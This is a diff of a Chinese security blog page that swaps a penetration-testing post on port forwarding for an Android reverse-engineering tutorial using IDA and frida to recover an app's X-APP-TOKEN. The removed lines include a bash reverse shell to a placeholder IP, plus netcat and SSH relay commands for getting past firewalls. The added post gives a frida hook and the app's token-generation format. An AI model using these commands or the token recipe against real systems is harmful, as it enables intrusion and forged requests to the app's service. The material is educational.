@@ -17,21 +17,24 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>渗透之端口转发 | Hexo</title>
-  <meta name="description" content="端口转发在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：  对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接">
+  <title>Android逆向第十课 - IDA+frida联合调试 | Hexo</title>
+  <meta name="description" content="今天，需要做的是通过 IDA和 frida 联合调试，获取请求中的token。我们这是用 X安 app进行演示。 抓包分析用fiddler抓包，看一下请求头中的主要内容，确定我们要找的字段是 X-APP-TOKEN。 apk逆向分析首先，我们要去分析apk是否被加固，如果加固了就要进行脱壳，没有加固就直接分析。用 jadx打开apk，可以发现文件的各个目录非常清晰，所以很大程度上并没有加固  接下">
 <meta property="og:type" content="article">
-<meta property="og:title" content="渗透之端口转发">
-<meta property="og:url" content="http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.html">
+<meta property="og:title" content="Android逆向第十课 - IDA+frida联合调试">
+<meta property="og:url" content="http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/index.html">
 <meta property="og:site_name" content="风景这边独好">
-<meta property="og:description" content="端口转发在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：  对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接">
+<meta property="og:description" content="今天，需要做的是通过 IDA和 frida 联合调试，获取请求中的token。我们这是用 X安 app进行演示。 抓包分析用fiddler抓包，看一下请求头中的主要内容，确定我们要找的字段是 X-APP-TOKEN。 apk逆向分析首先，我们要去分析apk是否被加固，如果加固了就要进行脱壳，没有加固就直接分析。用 jadx打开apk，可以发现文件的各个目录非常清晰，所以很大程度上并没有加固  接下">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-03-12T08:01:51.000Z">
-<meta property="article:modified_time" content="2021-08-01T02:48:52.718Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-19.png">
+<meta property="article:published_time" content="2021-04-18T06:01:51.000Z">
+<meta property="article:modified_time" content="2021-08-08T13:29:04.434Z">
 <meta property="article:author" content="Ye-Jun">
-<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="Android逆向">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-18.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.html">
+  <link rel="canonical" href="http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/index.html">
   
     <link rel="alternate" href="/atom.xml" title="风景这边独好" type="application/atom+xml">
   
@@ -222,7 +225,7 @@
   <div class="widget">
     <h3 class="widget-title">标签</h3>
     <div class="widget-body">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android%E9%80%86%E5%90%91/" rel="tag">Android逆向</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E5%AE%89%E5%85%A8/" rel="tag">Linux安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SqlMap/" rel="tag">SqlMap</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo%E4%BD%BF%E7%94%A8/" rel="tag">hexo使用</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javaScript/" rel="tag">javaScript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" rel="tag">计算机基础</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a><span class="tag-list-count">2</span></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android%E9%80%86%E5%90%91/" rel="tag">Android逆向</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E5%AE%89%E5%85%A8/" rel="tag">Linux安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SqlMap/" rel="tag">SqlMap</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo%E4%BD%BF%E7%94%A8/" rel="tag">hexo使用</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javaScript/" rel="tag">javaScript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" rel="tag">计算机基础</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a><span class="tag-list-count">2</span></li></ul>
     </div>
   </div>
 
@@ -241,7 +244,7 @@
   <div class="widget">
     <h3 class="widget-title">归档</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -305,7 +308,7 @@
                 
               </p>
               <p class="item-title">
-                <a href="/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/" class="title">Android逆向第九课 - IDA+frida联合调试</a>
+                <a href="/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/" class="title">Android逆向第十课 - IDA+frida联合调试</a>
               </p>
               <p class="item-date">
                 <time datetime="2021-04-18T06:01:51.000Z" itemprop="datePublished">2021-04-18</time>
@@ -341,14 +344,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-渗透之端口转发" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-Android逆向第十课" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      渗透之端口转发
+      Android逆向第十课 - IDA+frida联合调试
     </h1>
   
 
@@ -356,48 +359,48 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="article-date">
-	  <time datetime="2021-03-12T08:01:51.000Z" itemprop="datePublished">2021-03-12</time>
+	<a href="/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/" class="article-date">
+	  <time datetime="2021-04-18T06:01:51.000Z" itemprop="datePublished">2021-04-18</time>
 	</a>
 </span>
         
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+	<a class="article-tag-link-link" href="/tags/Android%E9%80%86%E5%90%91/" rel="tag">Android逆向</a>
   </span>
 
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/#comments" class="article-comment-link">评论</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：</p>
-<ol>
-<li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙</li>
-<li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口</li>
-</ol>
-<p>常用的方法有</p>
-<p><code>nc、lcx、socks、bash反弹、MSF后门反弹、frp</code></p>
-<h2 id="nc端口转发"><a href="#nc端口转发" class="headerlink" title="nc端口转发"></a>nc端口转发</h2><p>背景：192.168.50.1的用户ye需要访问192.168.50.2的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前ye用户只能访问192.168.50.2的9000端口。需要9000端口做转发。 </p>
-<ol>
-<li>在192.168.50.2上开启8000端口<br><code>nc -l 8000</code></li>
-<li>在192.168.50.2上实现9000端口转发<br><code>cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo</code></li>
-<li>在192.168.50.1上连接192.168.50.2的9000端口<br><code>nc -vn 192.168.50.2 9000</code></li>
-</ol>
-<h2 id="Shell命令实现端口转发"><a href="#Shell命令实现端口转发" class="headerlink" title="Shell命令实现端口转发"></a>Shell命令实现端口转发</h2><ol>
-<li>部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li>
-<li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 9987:10.154.62.197:3306 root@localhost </span><br><span class="line"><span class="meta">#</span><span class="bash"> 9987是本地创建的一个端口要把10.154.62.197服务器上的3306端口映射到本地的9987</span></span><br><span class="line">ssh -CfNg -R 1521:127.0.0.1:6300 root@localhost</span><br><span class="line"><span class="meta">#</span><span class="bash"> 作用同上, 只是在远程主机172.16.1.164上打开1521端口, 来映射本机的6300端口.</span></span><br></pre></td></tr></table></figure>
-案例：有A,B,C 3台服务器, A,C有公网IP, B是某IDC的服务器无公网IP. A通过B连接C的80端口(A&lt;=&gt;B&lt;=&gt;C), 那么在B上执行如下命令即可</li>
-</ol>
-<p>ssh -CfNg -L 6300:127.0.0.1:80 userc@C</p>
-<p>ssh -CfNg -R 80:127.0.0.1:6300 usera@A</p>
-<p>服务器A和服务器C之间, 利用跳板服务器B建立了加密隧道. 在A上连接127.0.0.1:80, 就等同C上的80端口. 需要注意的是, 服务器B上的6300端口的数据没有加密, 可被监听, 例:</p>
-<p>tcpdump -s 0 -i lo port 6300</p>
+        <p>今天，需要做的是通过 IDA和 frida 联合调试，获取请求中的token。我们这是用 X安 app进行演示。</p>
+<h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>用fiddler抓包，看一下请求头中的主要内容，确定我们要找的字段是 <code>X-APP-TOKEN</code>。</p>
+<h2 id="apk逆向分析"><a href="#apk逆向分析" class="headerlink" title="apk逆向分析"></a>apk逆向分析</h2><p>首先，我们要去分析apk是否被加固，如果加固了就要进行脱壳，没有加固就直接分析。用 jadx打开apk，可以发现文件的各个目录非常清晰，所以很大程度上并没有加固</p>
+<p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-18.png"></p>
+<p>接下来，我们可以直接在 jadx 中全局查找我们要找的字段，<code>X-APP-TOKEN</code>。（如果找不到的话，我们需要将要查找的字段进行合理分割，分别进行全局查找。）</p>
+<p>我们找到了目标字段后，就可以进入生成<code>X-APP-TOKEN</code>的class，可以最终生成相关字段的代码是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">getAS</span><span class="params">(Context context, String str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">   System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>属于 native 方法, 所以我们需要分析 libnative-lib.so 文件</p>
+<p>先用ida静态分析相关 so 文件，全局查找 <code>getAS </code>方法，无法找到，说明这个方法是被手动注册的，因为手动注册都是通过 <code>JNI_onload</code> 方法，我们可以进行这个方法查看详细信息，确定<code>getAS </code>方法修改后的名字。注意到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegisterNatives(v3, v4, (const JNINativeMethod *)off_DB004, 1)</span><br></pre></td></tr></table></figure>
+<p><code>RegisterNatives</code>是手动注册时调用，那么注册后的方法名肯定在这个方法里面，我们可以使用动态分析的方法获取注册后的方法名。最终可以知道，手动注册后的方法名为 <strong>getAuthString</strong>。<br>（其实手动注册后的方法名肯定还是有含义的，所以也可以 ctrl+f 慢慢找）</p>
+<p>进入 getAuthString 方法，可以看到整个代码非常长，所以直接分析很难，我们首先要关注的是 <strong>返回值</strong>，因为返回值肯定是我们要的 token。</p>
+<blockquote>
+<p>token的一般格式是： timestamp + 固定字符串 + device_id + 其他</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-19.png"><br>最后，我们发现 token 中还有一个关键信息 与 <code>b64_encode</code> 方法有关，因此我们可以使用 frida hook这个方法，将参数打印出来。</p>
+<p>但是，使用 frida hook某个函数时，一般要用 <code>Module.getExportByName(&#39;.so&#39;,&#39;func_name&#39;)</code>方法，而要 hook 的函数需要被 exports 出来，我们通过 ida 的 Exports 窗口，无法发现 <code>b64_encode</code> 方法，因此不能用这种的方式 hook。</p>
+<p>这里我们采用的方法是，通过<code>b64_encode</code>的绝对地址进行 hook。</p>
+<p>那么，如何使用静态分析找出 <code>b64_encode</code> 的绝对地址呢？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getAuthString_absulate_add = Module.getExportByName(<span class="string">&#x27;libnative-lib.so&#x27;</span>, <span class="string">&#x27;getAuthString&#x27;</span>);</span><br><span class="line"><span class="comment">// 首先获取一个方法的绝对地址</span></span><br><span class="line"><span class="keyword">var</span> native_lib_base_add = <span class="built_in">parseInt</span>(getAuthString_absulate_add) - <span class="built_in">parseInt</span>(<span class="string">&#x27;0x66500&#x27;</span>);</span><br><span class="line"><span class="comment">// 使用 绝对地址 - 相对地址 的方式，获取 so 文件的基地址</span></span><br><span class="line">send(<span class="string">&#x27;native_lib_base_add:&#x27;</span>+ptr(native_lib_base_add));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> md5_init_address = ptr(native_lib_base_add + <span class="built_in">parseInt</span>(<span class="string">&#x27;0x32455&#x27;</span>));</span><br><span class="line"><span class="comment">// 使用 基地址 + 相对地址 的方式，获取目标方法的绝对地址</span></span><br><span class="line">send(<span class="string">&#x27;md5_init_address: &#x27;</span> + md5_init_address);</span><br></pre></td></tr></table></figure>
+<p>最终，我们可以确定 token 的生成规则是：</p>
+<p> token = “token:// 1dek212ddovfkr “+  时间戳 + “$” + device_id + “&amp;” + packagename</p>
 
       
     </div>
@@ -407,7 +410,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" title="渗透之端口转发" target="_blank" rel="external">http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</a>
+      <a href="http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/" title="Android逆向第十课 - IDA+frida联合调试" target="_blank" rel="external">http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -454,12 +457,12 @@
   <ul class="pager pull-left">
     
     <li class="prev">
-      <a href="/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/" title="渗透之域渗透"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+      <a href="/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/" title="web安全之XSS蠕虫"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
     </li>
     
     
     <li class="next">
-      <a href="/2021/03/11/wen%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="web安全之信息收集"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2021/04/09/%E7%88%AC%E8%99%AB%E4%B9%8B%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81/" title="爬虫过验证码"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
